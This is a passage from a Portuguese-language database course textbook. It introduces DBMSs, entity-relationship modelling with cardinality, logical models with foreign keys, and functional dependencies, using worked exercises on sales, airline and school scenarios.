▪ Integração de Aplicações: os bancos de dados podem ser integrados a diversas 
aplicações, permitindo o compartilhamento de dados entre diferentes sistemas e 
aumentando a eficiência operacional da organização. 
Mas o que são sistemas de gerenciamento de Banco de Dados (SGBDs)? 
 
1.3 Sistemas Gerenciadores de Banco de Dados (SGBD) 
1.3.1 O Que é um SGBD e a sua Função? 
Um Sistema de Gerenciamento de Banco de Dados (SGBD) é composto por uma série 
de programas dedicados à administração da estrutura de um banco de dados e à regulação 
do acesso aos dados nele contidos.  
Ele atua como uma interface entre o usuário e o banco de dados, garantindo a gestão 
eficiente das informações. A estrutura do banco de dados é mantida por exemplo, em 
arquivos, sendo o SGBD o único meio de acesso a esses dados.  
As funcionalidades do SGBD abrangem desde a criação e modificação de estruturas, 
realização de testes, backups e restauração de dados, até a análise de desempenho e outras 
tarefas relacionadas à gestão eficiente do sistema. 
Exemplos: MySql, Postgresql, Oracle, Sql Server, Mongo, Db2, Caché, Firebird, Hsql  

14 
 
 
 
Figura 1.4: Conexão SGBD 
 
1.3.2 Principais Características e Funções de um SGBD 
São vantagens do uso de SGBDs: 
• Controle de redundância. 
• Aprimoramento da segurança de dados com o controle de acesso e uso de restrições 
e privilégios. 
• Armazenamento persistente. 
• Backup e Recuperação. 
• Compartilhamento de dados. 
• Fornecimento de múltiplas interfaces do usuário atendendo os usuários com diferentes 
níveis de conhecimento. 
• Gerenciamento de transações. 
• Restrições de integridade. 
 
Propriedades fundamentais 
Consistência de dados refere-se à garantia de que os dados armazenados no banco 
de dados estarão sempre corretos e coerentes. Isso significa que as informações não podem 
entrar em conflito umas com as outras e devem seguir regras de integridade definidas. Na 
Figura 1.5, vemos a mesma informação NOME nas tabelas, mas o dado em si, em cada 
tabela, está diferente. 

15 
 
 
 
Figura 1.5: Exemplo de uma tabela de dados 
 
A completeza diz respeito à garantia de que todas as informações relevantes são 
devidamente registradas no banco de dados. Isso significa que o banco de dados deve conter 
todos os dados necessários para atender aos requisitos do sistema ou aplicação, 
permanecendo completo e atualizado em todos os momentos. Na figura 6, vemos que 
ENDERECO tem registros com dados faltantes. Se esse é um campo importante, temos um 
problema de completeza. 
 
Figura 1.6: Exemplo de uma tabela de dados 
 
A validade refere-se à garantia de que os dados armazenados no banco de dados 
estão corretos e representam com precisão o mundo real. Isso implica que os dados devem 
ser precisos, confiáveis e atualizados. Na figura 1.7, vemos que o campo TELEFONE tem um 
valor não válido. 
 
Figura 1.7: Exemplo de uma tabela de dados 

16 
 
 
 
1.3.3 Exemplos de SGBDS Populares e suas Aplicações 
Existem diversos Sistemas de Gerenciamento de Banco de Dados (SGBDs) populares, 
cada um com suas características e aplicações específicas.  
MySQL 
Amplamente utilizado em uma variedade de ambientes, desde pequenos websites até 
grandes corporações. É especialmente popular para aplicações da web devido à sua facilidade 
de uso e desempenho confiável. 
Microsoft SQL Server 
Amplamente utilizado em ambientes corporativos, especialmente em empresas que 
utilizam outros produtos da Microsoft. É conhecido por sua escalabilidade e robustez, sendo 
frequentemente usado para aplicações empresariais críticas. 
Oracle Database 
Usado principalmente em grandes empresas e organizações que requerem um alto 
desempenho e escalabilidade. É comumente utilizado em aplicações empresariais de missão 
crítica como sistemas bancários, telecomunicações e empresas de serviços financeiros, onde 
a confiabilidade e a segurança são fundamentais. 
PostgreSQL 
Conhecido por sua robustez, conformidade com padrões e recursos avançados, o 
PostgreSQL é amplamente utilizado em uma variedade de aplicações.  
MongoDB 
É um banco de dados NoSQL orientado a documentos, o MongoDB é frequentemente 
escolhido para aplicações que requerem flexibilidade no esquema de dados e alta 
escalabilidade como aplicações de comércio eletrônico, redes sociais e sistemas de 
gerenciamento de conteúdo.  
Instalando o Mysql 
Nesta disciplina, vamos usar o MySQL como nosso SGBD, para instalá-lo em ambiente 
Windows, entre no site, baixe o instalador da versão MySQL Community Server e o execute. 
https://dev.mysql.com/downloads/installer/ 

17 
 
 
 
Figura 1.8: Baixando MySQL 
 
Precisaremos também de uma interface para nos ajudar a manipular o banco de 
dados. Usaremos o MySQL Workbench. Para instalá-lo em ambiente Windows, entre no site, 
baixe o instalador e o execute. Faça isso depois de ter instalado o MySQL. 
https://dev.mysql.com/downloads/workbench/ 
 
Figura 1.9: Baixando MySQL Workbench 
 
Ambiente online de execução do Mysql 
Caso não seja possível instalar o ambiente na máquina, podemos usar uma versão 
online de um SGBD. Execute o código MySQL usando o IDE on-line do myCompiler.  
https://www.mycompiler.io/pt/new/mysql 

18 
 
 
Mas, tenha em mente que os recursos serão limitados, e nas aulas da disciplina será 
utilizado a versão Windows. 
Ambiente online para criar os modelos 
Vamos criar muitos modelos nesta disciplina e precisamos de uma ferramenta que nos 
auxilie a desenhar esses modelos. Vamos usar a versão online do brModelo. Entre no site e 
crie uma conta. 
https://app.brmodeloweb.com/ 
 
Figura 1.10: Login BRMW 
 
 
Figura 1.11: Criação de um modelo 
 

19 
 
 
 
Figura 1.12: Área de trabalho brModelo We 
 
 

20 
 
 
 
 
MODELO DE DADOS 
Do que foi exposto até agora, percebemos que não é simples definir as tabelas, 
estruturar os tipos relacionamentos e tudo que está relacionado ao armazenamento de dados 
em um banco de dados. Então, ANTES DE CRIAR AS TABELAS é preciso seguir 
procedimentos que ajudarão a garantir que os dados serão mapeados da forma correta. 
A primeira etapa é criar um modelo de dados, também conhecido como esquema de 
banco de dados. Esse modelo descreve de maneira formal a estrutura do banco de dados. 
Ele descreve quais os dados que o banco armazenará, não os dados em si, mas o tipo de 
dados. Para o nosso exemplo da empresa, um modelo de dados descreveria que 
armazenaríamos matrícula, nome e telefone dos vendedores.  
O modelo de dados tem duas subcategorias: modelo conceitual e modelo lógico. O 
modelo conceitual independe do SGBD que será usado. Já o modelo lógico leva em 
consideração o tipo de SGBD que será usado. Temos ainda, o projeto ou modelo físico, que 
é a etapa final para construção real do banco de dados. 
Ao final dos estudos, você deverá ser capaz de: entender sobre o processo de criação 
do modelo de dados, as características de um modelo conceitual e um modelo lógico. 
 
2.1 Introdução ao Modelo Entidade-Relacionamento (MER) 
• Modelo conceitual 
Este modelo é criado na primeira fase de um projeto de banco de dados na qual os 
dados da empresa são mapeados e representados na forma de um Diagrama de Entidade 
Relacionamento (DER). Neste momento, não nos preocupamos se vamos criar tabelas ou 
não. Apenas modelamos quais dados a empresa necessita que sejam armazenados e tratados 
por uma aplicação de software. 
• Entidade 
UNIDADE 2 

21 
 
 
Como todo diagrama, o DER possui elementos com finalidades específicas. A entidade 
é o elemento principal de um DER, representa o elemento da realidade que se deseja manter 
a informação. 
Considere o cenário de uma organizadora de torneio de futebol que deseja organizar 
os dados dos torneios em uma base de dados. Sobre o que essa empresa precisaria manter 
informação? Pense nos SUBSTANTIVOS. Ela precisa por exemplo, manter informação dos 
TIMES, TORNEIOS, JOGADORES, PARTIDAS, ARBITROS. Essas informações seriam as 
entidades desse projeto de torneio. 
E para um Petshop que deseja manter os dados dos atendimentos de animais que vão 
tomar banho, fazer tosa, etc.? Um bom conjunto de entidades seria: ANIMAIS, CLIENTES, 
ATENDIMENTOS, FUNCIONÁRIOS, PRODUTOS. 
Podemos montar um conjunto de entidades para o nosso exemplo anterior de vendas. 
Seriam entidades: CLIENTES, VENDAS, VENDEDORES, PRODUTOS, ESTOQUE. 
No DER uma entidade é representada por um retângulo. Na Figura 13 vemos seis 
entidades: CLIENTES, VENDAS, VENDEDORES, PRODUTOS, ESTOQUE e FUNCIONÁRIOS. 
 
Figura 2.1: Exemplo de entidades de um sistema de venda 
 
• Atributo 
Uma propriedade de uma entidade é o atributo. Atributo é o dado que é associado a 
cada ocorrência de uma entidade. Por exemplo, se temos uma ocorrência de uma entidade 
PRODUTOS, isso significa que temos UM produto específico. Quais seriam os dados deste 
produto? Poderia ser CODIGO, NOME, PRECO. Esses seriam os atributos da entidade 
PRODUTOS.  
Lembre-se, não interessa agora quais são os dados reais, só precisamos saber que 
será necessário armazenar os dados CODIGO, NOME, PRECO das instâncias da entidade 

22 
 
 
PRODUTOS. Os atributos podem ou não ser representados no DER. A representação seria: 
 
Figura 2.2: Representação gráfica dos atributos de uma entidade 
 
Perceba que o código está pintado. Isso acontece porque se pensarmos nos códigos 
dos produtos, nunca existirá dois produtos com o mesmo código, pelo menos não deveria. 
Esse atributo é chamado de chave. Ele representa unicamente os valores do produto. 
Podemos ter produtos com o mesmo nome, com o mesmo valor, por isso, esses atributos 
não estão marcados, mas nunca com o mesmo código. Uma entidade dever ter pelo menos 
um atributo identificador chave, pois é ele que vai distinguir as ocorrências da entidade. 
Vamos pensar no problema da empresa que precisa armazenar dos seus clientes e 
dos vendedores. 
 
Figura 2.3: Entidade do problema das vendas 
 
Exercício 1: VAMOS PRATICAR! 
Um desafio, você consegue encontrar as entidades, os atributos de cada entidade e o 
atributo identificador (chave) neste cenário? Utilize SOMENTE as informações que estão no 
cenário, não invente ou pressuponha conforme seus conhecimentos da realidade. Seja fiel 
ao cenário. 

23 
 
 
Uma companhia aérea está buscando desenvolver um sistema de gestão para 
melhorar a eficiência e a precisão em suas operações. A empresa deseja que você 
projete um Diagrama de Entidade-Relacionamento (DER) para representar as 
principais entidades do sistema. Considere as seguintes informações: Cada voo 
possui um número de voo único, uma rota específica (origem e destino), e uma 
data e horário de partida. Cada passageiro tem um número de identificação único, 
nome, endereço e informações de contato. Os passageiros podem fazer reservas 
em voos específicos. Cada reserva está associada a um passageiro. Cada reserva 
tem um número e deve incluir informações sobre a data da reserva e o status da 
reserva (confirmada, pendente, cancelada). 
Resposta do Exercício 1 
 
Figura 2.4: Entidades do cenário 
 
• Atributo identificador 
O atributo identificador é um campo único ou uma combinação de campos que define 
exclusivamente um registro.  
Exemplo:  
▪ Campo único: CPF do cliente 
▪ Combinação de Campos: código do cliente, código do livro e data de locação 
 
Figura 2.5: Exemplo de atributo identificador 

24 
 
 
 
• Atributo multivalorado 
Um atributo multivalorado é um tipo de atributo que pode conter múltiplos valores 
para uma única instância de uma entidade. Isso significa que, ao contrário de um atributo 
simples, que contém apenas um valor para cada instância da entidade, um atributo 
multivalorado pode conter vários valores. 
Por exemplo, considere uma entidade "Livro" em um banco de dados de uma 
biblioteca. O atributo "Autores" pode ser multivalorado, pois um livro pode ter mais de um 
autor. Portanto, para cada livro, pode haver múltiplos valores associados ao atributo 
"Autores", como "Autor1", “Autor2” etc. 
 
Figura 2.6: Exemplo de atributo multivalorado 
 
• Atributos compostos 
É um tipo de atributo que pode ser dividido em partes menores ou componentes. Em 
outras palavras, um atributo composto é formado por múltiplos subatributos que têm 
significado por si só, e que juntos compõem o atributo maior. 
Por exemplo, considere uma entidade "Endereço" em um banco de dados de uma 
empresa. O atributo "Endereço" pode ser composto por vários subatributos, como "Rua", 
"Número", "Cidade", "Estado" e "CEP". 
 
Figura 2.7: Exemplo de atributo composto 

25 
 
 
 
Exercício 2: VAMOS PRATICAR! 
Encontre as entidades e atributos dos cenários seguintes. Defina atributos conforme 
seus conhecimentos da área. 
1) Um sistema de reservas de voo permite que os passageiros busquem voos disponíveis, 
façam reservas e gerenciem suas viagens. 
2) Um sistema de registro acadêmico de uma universidade gerencia informações sobre 
alunos, cursos e as disciplinas cursadas. 
3) Um aplicativo de entrega de comida permite que os usuários peçam comida de 
restaurantes locais e rastreiem suas entregas. 
4) Um sistema de gerenciamento de hospital mantém registros de pacientes, médicos, leitos 
e tratamentos médicos. 
5) Um sistema de gerenciamento de estoque de uma loja controla o inventário de produtos, 
fornecedores e pedidos. 
 
Resposta do Exercício 2 
1) Um sistema de reservas de voo permite que os passageiros busquem voos disponíveis, 
façam reservas e gerenciem suas viagens. 
Entidades: Passageiro, Voo, Reserva 
Atributos: 
Passageiro: Nome, Número de Identificação, Contato 
Voo: Número do Voo, Origem, Destino, Data e Hora, Duração 
Reserva: Número de Reserva, Assentos, Status 
2) Um sistema de registro acadêmico de uma universidade gerencia informações sobre 
alunos, cursos e as disciplinas cursadas. 
Entidades: Aluno, Curso, Disciplina, Professor, Matrícula 
Atributos: 
Aluno: Nome, Matrícula, Curso, E-mail 
Curso: Nome, Código, Departamento 
Disciplina: Nome, Código, Créditos 
Professor: Nome, Departamento, Especialização 
Matrícula: Ano, Período, Notas 

26 
 
 
3) Um aplicativo de entrega de comida permite que os usuários peçam comida de 
restaurantes locais e rastreiem suas entregas. 
Entidades: Cliente, Restaurante, Pedido, Entregador, Produto 
Atributos: 
Cliente: Nome, Endereço, Método de Pagamento 
Restaurante: Nome, Tipo de Cozinha, Horário de Funcionamento 
Pedido: Número do Pedido, Itens, Status 
Entregador: Nome, Veículo, Rota 
Produto: Nome, Descrição, Preço 
4) Um sistema de gerenciamento de hospital mantém registros de pacientes, médicos, leitos 
e tratamentos médicos. 
Entidades: Paciente, Médico, Leito, Tratamento, Departamento 
Atributos: 
Paciente: Nome, Número de Identificação, Data de Nascimento 
Médico: Nome, Especialidade, Horário de Atendimento 
Leito: Número, Tipo, Status 
Tratamento: Descrição, Data, Resultado 
Departamento: Nome, Localização, Responsável 
5) Um sistema de gerenciamento de estoque de uma loja controla o inventário de produtos, 
fornecedores e pedidos. 
Entidades: Produto, Fornecedor, Pedido, Estoque, Categoria 
Atributos: 
Produto: Nome, Código, Preço, Quantidade em Estoque 
Fornecedor: Nome, Contato, Endereço 
Pedido: Número do Pedido, Data, Status 
Estoque: Localização, Quantidade Mínima, Quantidade Máxima 
Categoria: Nome, Descrição 
 
• Relacionamento 
Ampliando o exemplo da empresa, suponha que a empresa tenha anotado os dados 
das vendas feitas por cada vendedor a um determinado cliente e pretende armazenar essas 

27 
 
 
informações no banco de dados. 
 
Figura 2.8: Dados das vendas 
 
Olhando as anotações das empresas, vemos que foram anotados os nomes dos 
vendedores e dos clientes, mas esses são atributos que já pertencem a outras entidades, as 
entidades de VENDEDORES e CLIENTES respetivamente, a VENDA possui como atributo 
próprio apenas o seu identificador e o valor. Isso nos indica que existe um relacionamento 
entre VENDA e VENDEDORES, e entre VENDA e CLIENTES. 
Relacionamento são as associações que fazemos entre as entidades. Um vendedor 
pode fazer mais de uma venda. Observe na Figura 2.9 que o vendedor André Costa fez duas 
vendas, uma de R$5000,00 e outra de R$ 17000,00. O outro relacionamento é que um cliente 
pode ser o titular de várias vendas, o cliente José da Silva é um exemplo. 
No DER representamos os relacionamentos por losangos ligados às entidades que se 
relacionam. Perceba que os atributos de VENDAS são apenas o seu ID (identificador) e o 
valor da venda. A relação é mostrada nos losangos. Não se preocupe com os dados neste 
momento. No modelo conceitual são identificados apenas os dados que manteremos no 
banco, quais são os atributos e se existe relação entre as entidades. Veja a representação 
gráfica no DER desses relacionamentos. Por enquanto, vamos ignorar esse pares (1,1), (0,n) 
e (1,1). 

28 
 
 
 
Figura 2.9: Modelo conceitual 
 
No exemplo da companhia aérea, temos VOOS, PASSAGEIROS e RESERVAS, existe 
relação? Claro, um passageiro pode fazer várias reservas. Cada reserva poderia ter vários 
passageiros associados a ela, além de que uma reserva tem um ou mais voos registrados e 
cada voo pode aparecer em diversas reservas diferentes. Esse cenário de relacionamentos 
poderia ser descrito conforme a Figura 2.10. 
 
Figura 2.10: Modelo conceitual 
 
2.2 Cardinalidade entre Relacionamentos 
• Cardinalidade  
Lembre-se, estamos fazendo um modelo conceitual abstrato, que não mostra os dados 
reais, apenas demostra o que deve ser registrado no banco de dados e como esses dados se 

29 
 
 
relacionam. Através deste modelo, devemos ser capazes de entender o que e como o banco 
de dados precisa ser projetado. Temos que colocar no diagrama o máximo de informação 
possível que dê as dicas do que precisa ser feito. 
Já mostramos como descrever as entidades e seus atributos, também como identificar 
se as entidades se relacionam (se “conhecem”). Precisamos agora, estabelecer a 
cardinalidade do relacionamento, que são esses pares ordenados que aparecem nas linha: 
(1,1), (0,n) e (1,n). 
A cardinalidade é o número mínimo e máximo de ocorrências de entidades associadas 
a outras. O primeiro valor do par ordenado é o mínimo e o segundo o máximo (mínimo, 
máximo): 
• (1,1): no mínimo um e no máximo um 
• (0,n) : no mínimo zero e no máximo muitos 
• (1,n) : no mínimo um e no máximo muitos 
• (n,n): no mínimo muitos e no máximo muitos 
Os valores máximo e mínimo, representados por n, poderiam ser trocados por outros 
valores fixos, por exemplo (1,2) no mínimo um e no máximo dois. Essa escolha depende da 
organização que mantêm os dados. É preciso perguntar para o dono do dado.  
Os valores 0 e 1 na cardinalidade mínima é entendida também como obrigatoriedade, 
se tiver valor 1 indica que o relacionamento deve associar pelo menos uma ocorrência, já o 
valor 0 diz que essa associação é opcional. 
No exemplo de vendas, o vendedor André Costa pode fazer quantas vendas? Ele pode 
fazer nenhuma ou muitas, não é verdade? Então, no banco de dados podemos ter para um 
vendedor específico com nenhuma ou várias vendas atribuídas a ele. Modelamos isso 
colocando (0,n) no relacionamento entre as entidades VENDEDOR e VENDAS nesse sentido, 
e perto de VENDAS. Agora, se olharmos para uma única venda específica, por exemplo, a 
venda de número 2, quantos vendedores efetuaram essa venda? Apenas o vendedor André. 
Assim, modelamos o outro sentido da relação, colocando (1,1) do lado de VENDEDOR para 
dizer que para uma venda específica associamos apenas um vendedor. 

30 
 
 
 
Figura 2.11: Sentido de leitura do relacionamento e cardinalidade entre entidades 
 
Exercício 3: VAMOS PRATICAR! 
Uma floricultura deseja informatizar suas operações. Inicialmente, deseja manter um 
cadastro de todos os seus clientes, mantendo informações como: RG, nome, telefone e 
endereço. Deseja também manter um cadastro contendo informações sobre os produtos que 
vende, tais como: nome do produto, tipo (flor, vaso, planta), preço e quantidade em estoque. 
Quando um cliente faz uma compra, a mesma é armazenada, mantendo informação sobre o 
cliente que fez o pedido, a data da compra, o valor total e os produtos comprados.  
Monte o diagrama entidade-relacionamento. 
Resposta do exercício 3 
 
Figura 2.12: Modelo conceitual 
 

31 
 
 
• Atributo de relacionamento 
Os atributos de relacionamento podem ser utilizados para expressar as restrições ou 
as características específicas do relacionamento. Por exemplo, se houver um relacionamento 
"Emprestado para", podemos ter atributos como "Data de empréstimo" e "Data de 
devolução" para indicar quando um LIVRO foi emprestado e quando ele precisa ser devolvido.  
Perceba que os atributo "Data de empréstimo" e "Data de devolução" só existem se o 
relacionamento empréstimo for efetivado. Não é a mesma coisa que os atributos título do 
LIVRO ou matrícula do USUARIO que são independentes de um relacionamento. 
 
Figura 2.13: Modelo conceitual 
 
Exercício 4: VAMOS PRATICAR! 
Uma escola está desenvolvendo um sistema de gestão e precisa armazenar os dados 
de cada aluno: número de matrícula único, nome e endereço. Quer registrar também as 
informações da matrícula do aluno como data da matrícula e o valor da mensalidade. É 
importante registrar os cursos da escola que possuem número e nome. Um aluno ao se 
matricular escolhe o curso que ele pretende fazer. Nessa escola o aluno pode até se inscrever 
em diversos cursos, mas cada matrícula deve ser para apenas um dos cursos. O desafio é 
encontrar as entidades, atributos e estabelecer as relações com a cardinalidade correta entre 
as entidades definidas, considerando a matrícula como ponto de ligação entre os alunos e os 
cursos. 

32 
 
 
Monte o diagrama entidade-relacionamento. 
Resposta do exercício 4 
 
Figura 2.14: Modelo conceitual 
 
Observe que a data da matrícula e o valor da mensalidade só existem quando o ALUNO 
se matricula no CURSO. 
• Relacionamento binário e ternário 
Relacionamento binário é o que acontece entre duas entidades, vimos isso nos 
exemplos anteriores. Mas existe também o relacionamento ternário, entre três entidades. 
Podemos ter também relacionamentos quaternários, etc., dependendo da quantidade de 
tabelas que se relacionam. Vamos focar apenas nos ternários. 
Vamos usar o exemplo do livro Projeto de Banco de Dados do Carlos Alberto Heuser 
para exemplificar uma situação ternária. O modelo representa CIDADE, DISTRIBUIDOR e 
PRODUTO. O distribuidor pode distribuir produtos em diversas cidades. O modelo proposto 
está na Figura 2.15, perceba que o losango do relacionamento ternário liga as três entidades. 
Mas como ler essas cardinalidades? A cardinalidade neste caso é vista aos pares únicos de 
entidades. 
 

33 
 
 
Figura 2.15: Sentido de leitura do relacionamento e cardinalidade entre entidades 
 
Na Figura 2.16, tem a análise de CIDADE e PRODUTO. Imagine uma cidade qualquer 
(Goiânia) e um produto vendido (Feijão). O que o modelo diz a respeito da quantidade de 
distribuidores desse único produto para essa única cidade? Olhamos para a cardinalidade 
próxima a DISTRIBUIDOR, o modelo diz que uma CIDADE tem para cada PRODUTO um e 
somente um DISTRIBUIDOR, ou seja, não teremos um produto sendo distribuído por mais 
de um distribuído. Existe exclusividade produto x distribuidor em cada cidade. 
 
Figura 2.16: Sentido de leitura PRODUTO, CIDADE => DISTRIBUIDOR 
 
Olhando o sentido DISTRIBUIDOR, PRODUTO em relação à CIDADE na Figura 2.17. 
Cada distribuidor distribui cada produto dele em várias cidades.  
 
Figura 2.17: Sentido de leitura DISTRIBUIDOR, PRODUTO => CIDADE 
 

34 
 
 
Por último, o sentido DISTRIBUIDOR, CIDADE em relação ao PRODUTO na Figura 
2.18. Cada distribuidor distribui em cada cidade vários produtos.  
 
Figura 2.18: Sentido de leitura DISTRIBUIDOR, CIDADE => PRODUTO 
 
2.3 Modelo lógico 
Uma vez que os dados já foram mapeados na forma de um DER é preciso definir o 
tipo de SGBD (relacional, rede, orientado a objetos, etc.) que será usado e transformar o 
modelo conceitual em modelo lógico. O modelo lógico depende do tipo de SGBD que iremos 
usar detalhando como as informações serão armazenadas internamente.  
Neste curso, abordaremos o modelo relacional no qual os dados são armazenados em 
formato de tabela. 
Considere o modelo conceitual da figura 2.19 
 
Figura 2.19: Modelo conceitual 
 
Um modelo lógico tem originem em um modelo conceitual. Enquanto o modelo 

35 
 
 
conceitual é uma representação de alto nível que descreve os conceitos e as relações entre 
eles em um domínio específico, se concentrando na semântica e nos relacionamentos entre 
entidades, ignorando detalhes de implementação. O modelo lógico é uma representação mais 
detalhada e estruturada dos dados, capturando como os dados serão armazenados e 
organizados no sistema de gerenciamento de banco de dados (SGBD). Ele traduz os conceitos 
abstratos do modelo conceitual em estruturas de dados concretas, como tabelas, colunas e 
chaves. 
Para o exemplo da Figura 2.19 o modelo lógico teria uma estrutura como a seguinte: 
• CLIENTES (codigo, nome, idade, endereco, telefone); 
• VENDEDORES (matricula, nome, telefone); 
• VENDAS (id, codigo_cliente, mat_vendedor, valor): 
• codigo_cliente referencia CLIENTES; 
• mat_vendedor referencia VENDEDORES. 
Sendo que: 
• CLIENTES: 
o Tabela: CLIENTES; 
o Atributos: código (chave primária), nome, idade, endereco, telefone. 
 
• VENDEDORES: 
o Tabela: VENDEDORES; 
o Atributos: matricula (chave primária), nome, telefone. 
 
• VENDAS: 
o Tabela: VENDAS 
o Atributos: id (chave primária), valor 
o Chaves estrangeiras: 
▪ codigo_cliente referenciando a tabela CLIENTES (indicando 
qual cliente fez a compra) 
▪ mat_vendedor referenciando a tabela VENDEDORES (indicando 
qual vendedor realizou a venda) 

36 
 
 
 
Importante notar que uma chave estrangeira (ou chave externa) é um conceito em 
bancos de dados relacionais que estabelece uma relação entre duas tabelas. Ela é uma coluna 
ou conjunto de colunas em uma tabela que faz referência à chave primária ou a uma chave 
única em outra tabela. Essa referência cria um vínculo entre as duas tabelas, permitindo que 
os dados em uma tabela estejam relacionados aos dados em outra tabela. 
Quando uma chave estrangeira é definida em uma tabela, ela garante que os valores 
na coluna de chave estrangeira só possam aparecer se já existirem na coluna correspondente 
na tabela referenciada (a tabela pai). Isso ajuda a manter a integridade dos dados, evitando 
que sejam inseridos valores inválidos nas colunas de referência. 
Por exemplo, considerando o modelo lógico fornecido anteriormente: 
Na tabela VENDAS, as colunas codigo_cliente e mat_vendedor são chaves 
estrangeiras. 
codigo_cliente faz referência à chave primária (código) na tabela CLIENTES. 
mat_vendedor faz referência à chave primária (matricula) na tabela VENDEDORES. 
Isso significa que cada entrada na tabela VENDAS deve corresponder a um cliente e 
a um vendedor que já existe nas tabelas CLIENTES e VENDEDORES, respectivamente. Se um 
registro de venda tentar referenciar um cliente ou vendedor que não existe nas tabelas já 
existente, isso violaria a integridade referencial e seria impedido pelo banco de dados. 
Ao invés de colocar o nome dos vendedores e cliente colocamos as matrículas e 
códigos. 
 
Figura 2.20: Tabela de VENDAS com chaves estrangeiras mat_vendedor e código_cliente 
 

37 
 
 
 
Figura 2.21: Relacionamento entre as tabelas (visão com dados) 

 
 
 
NORMALIZAÇÃO DE 
TABELAS  
 
Nesta unidade, exploraremos os princípios fundamentais da normalização de tabelas 
em bancos de dados. A normalização é um processo crucial para projetar esquemas de banco 
de dados que garantam a integridade dos dados, a eficiência das consultas e a facilidade de 
manutenção do sistema. Ao compreender os conceitos de dependência funcional e as formas 
normais, os profissionais de banco de dados podem criar estruturas robustas e otimizadas 
para armazenar e manipular informações. 
Ao final dos estudos, você deverá ser capaz de: entender os conceitos de dependência 
funcional e as estratégias de normalização de um modelo de dados. 
 
3.1 Dependência Funcional 
A dependência funcional é um conceito da matemática que estabelece uma relação 
entre os atributos de dois conjuntos, indicando que valores de um conjunto influenciam ou 
determinam os valores de outro dentro de uma relação.  
Considere que não existe repetição de nome em um conjunto que armazena o nome 
de funcionários. Observe que os valores do conjunto MATRICULA, identificam um elemento 
no conjunto NOME. Se pegarmos o nome André Costa, a matrícula dele unicamente só pode 
ser 3426, não existe mais de uma opção 
UNIDADE 3 

39 
 
 
Figura 3.1: Dependência funcional 
 
Podemos ver que cada matrícula está relacionada a um único nome: 
2335 → {Tomé Mascarenhas} 
3426 → {André Costas} 
2421 → {João Sousa} 
Agora, observe os conjuntos MATRICULA e DEPARTAMENTO, com uma matrícula 
podendo ter mais de um departamento associado a ela, como é o caso da matrícula 2335. 
Assim, existe dependência funcional entre MATRICULA e NOME, mas não existe entre 
MATRICULA e DEPARTAMENTO. 
 
Figura 3.2: Não tem dependência funcional 
 
Observa as relações entre os valores concretos: 
2335 → {Eletrodoméstico, Cama e Mesa} 
3426 → {Eletrodomésticos} 
2421 → {Cama e Mesa} 
Resumimos assim, a dependência funcional: 

 
Dados dois conjuntos A e B, diz-se que B é funcionalmente dependente de A, ou A 
determina B, ou B depende de A, se cada valor de A estiver associado a um e somente um 
valor de B. Pode ser representado assim: 
A → B 
Esse conceito é usado em banco de dados. Segundo ELMASRI e NAVATHE (2019), 
“uma dependência informal é uma restrição entre dois conjuntos de atributos de um banco 
de dados”. Falando assim, fica complicado entender, vamos exemplificar. 
 
Figura 3.3: Tabela vendedores 
 
Vamos transformar o exemplo dos conjuntos em tabelas. Considere a Tabela 
VENDEDORES, e os dados registrados como na Figura 3.3, se o atributo MATRICULA 
determina de forma única o NOME do vendedor, então, temos a dependência funcional, que 
é o caso do exemplo. Representamos a dependência com a seta, como a seguir 
Matricula → Nome 
Isso significa que o NOME depende da MATRICULA do vendedor, existe uma relação 
um-para-um. Agora, considere a dependência: 
Matricula → Departamento 
Com base nos dados, esta dependência está errada. Não existe uma dependência 
funcional clara entre MATRICULA e DEPARTAMENTO, pois uma MATRICULA pode pertencer 
a diferentes DEPARTAMENTOS ao longo do tempo. Observe que o vendedor de matrícula 
2335 aparece em dois departamentos: Eletrodomésticos e Cama e Mesa. 
A relação inversa também não existe. 
Departamento → Matricula 
Isso porque um departamento determina mais de uma matrícula. 
Eletrodomésticos → {2334, 3426} 

41 
 
Cama e Mesa → {2121, 2335} 
A dependência funcional em banco de dados pode ser verificada entre vários atributos. 
Por exemplo, ser do tipo A → BC, ou AB → C. 
Vamos exemplificar com MATRICULA, DEPARTAMENTO e HORARIO. Pelo exemplo da 
tabela da Figura 3.4, existe dependência. 
 
Figura 3.4: Tabela vendedores 
 
São exemplos de dependências que poderíamos analisar: 
Matricula → Departamento, Horário 
Departamento, Horário → Matricula  
Você consegue indicar se existe ou não dependência funcional para esses exemplos, 
considerando os dados da tabela representada na Figura 3.4? 
Para ficar mais fácil pensar na possível resposta, vamos colocar os dados: 
Matricula → Departamento, Horário 
2335 → {(Eletrodoméstico, Matutino), (Cama e Mesa, Vespertino)} 
3426 → {(Eletrodoméstico, Integral)} 
2421 → {(Cama e Mesa, Integral)} 
Neste caso, não existe dependência funcional. 
 
Departamento, Horário → Matricula  
(Eletrodoméstico, Matutino), → 2335 
(Cama e Mesa, Vespertino) → 2335 
(Eletrodoméstico, Integral) → 3426 
(Cama e Mesa, Integral) → 2421 
Neste caso, existe dependência funcional porque a matrícula 2335 tem relação com mais de 
um par Departamento, Horário. 

 
 
Regras das dependências funcionais 
• Separação/Decomposição 
Se A → BC 
então: 
A → B 
A → C 
Um exemplo desta relação para os dados da tabela da Figura 3.4: 
Se Matricula → Nome, Telefone 
então: 
Matricula → Nome 
Matricula → Telefone 
• Acumulação 
Se A → B 
então: 
AC → B 
Um exemplo desta relação para os dados da tabela da Figura 3.4: 
Se Matricula → Nome 
então: 
Matricula, Horario → Nome 
• Transitividade 
Se A → B e B → C 
então: 
A → C 
Um exemplo desta relação para os dados da tabela da Figura 3.4: 
Se Matricula → Nome e Nome → Telefone 
então: 
Matricula → Telefone 
• Decomposição 
Se A → BC e BC → D 

43 
 
então: 
AC → D 
Para este exemplo, a nossa tabela não possui opção.  
Exercício 1: VAMOS PRATICAR! 
Um desafio, para a estrutura de tabela da Figura 3.4, agora, com os atributos 
Matrícula, Nome, Telefone, Endereço, Departamento, Horário, Salário. Considere que as 
regras para os dados que serão armazenados sejam os seguintes: 
• A matrícula é única por vendedor e chave primária na tabela. 
• Podem existir vendedores homônimos (com o mesmo nome). 
• O telefone é único por vendedor. 
• Pode ter dois vendedores morando em um mesmo endereço. 
• Um vendedor só pode estar lotado em um departamento. 
• Um vendedor só trabalha em um único horário por departamento. 
• Os salários podem ser diferentes entre vendedores, mas um vendedor só tem um 
salário. 
Para uma tabela com estas regras, diga se existe ou não dependência funcional para 
os exemplos abaixo: 
• Matricula → Departamento, Horário 
• Matricula → Endereco 
• Endereco → Matricula 
• Matricula → Telefone, Endereco 
• Departamento, Horário → Matricula 
• Matricula → Departamento, Horário 
• Matricula → Salário 
• Salário → Matricula 
• Salário → Matricula, Departamento 
 
